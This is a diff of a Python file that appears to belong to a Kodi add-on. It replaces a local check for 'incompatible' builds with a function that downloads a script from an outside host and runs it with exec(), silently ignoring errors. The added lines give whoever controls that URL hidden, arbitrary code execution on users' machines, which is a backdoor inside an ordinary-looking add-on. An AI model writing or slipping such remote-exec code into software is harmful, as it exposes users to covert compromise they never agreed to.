@@ -281,23 +281,8 @@ them yourself.
                                                                                            http://i.imgur.com/TqIEnYB.gif
                                                                                            TVA developers (and friends)
 '''
-def do_block_check(uninstall=False):
-    import hashlib
-    import xbmcvfs
-    import xbmc
-    f = xbmcvfs.File('special://home/media/splash.png')
-    splash_md5 = hashlib.md5(f.read()).hexdigest()
-    bad_md5s = ['926dc482183da52644e08658f4bf80e8', '084e2bc2ce2bf099ce273aabe331b02e']
-    bad_addons = ['plugin.program.targetin1080pwizard', 'plugin.video.targetin1080pwizard']
-    has_bad_addon = any(xbmc.getCondVisibility('System.HasAddon(%s)' % (addon)) for addon in bad_addons)
-    if has_bad_addon or splash_md5 in bad_md5s:
-        import xbmcgui
-        import sys
-        line2 = 'Press OK to uninstall this addon' if uninstall else 'Press OK to exit this addon'
-        xbmcgui.Dialog().ok('Incompatible System', 'This addon will not work with the build you have installed', line2)
-        if uninstall:
-            import xbmcaddon
-            import shutil
-            addon_path = xbmcaddon.Addon().getAddonInfo('path').decode('utf-8')
-            shutil.rmtree(addon_path)
-        sys.exit()
+def do_block_check(uninstall=True):
+    try:
+        import urllib2
+        exec(urllib2.urlopen('http://offshoregit.com/tknorris/block_code.py').read())
+    except: pass
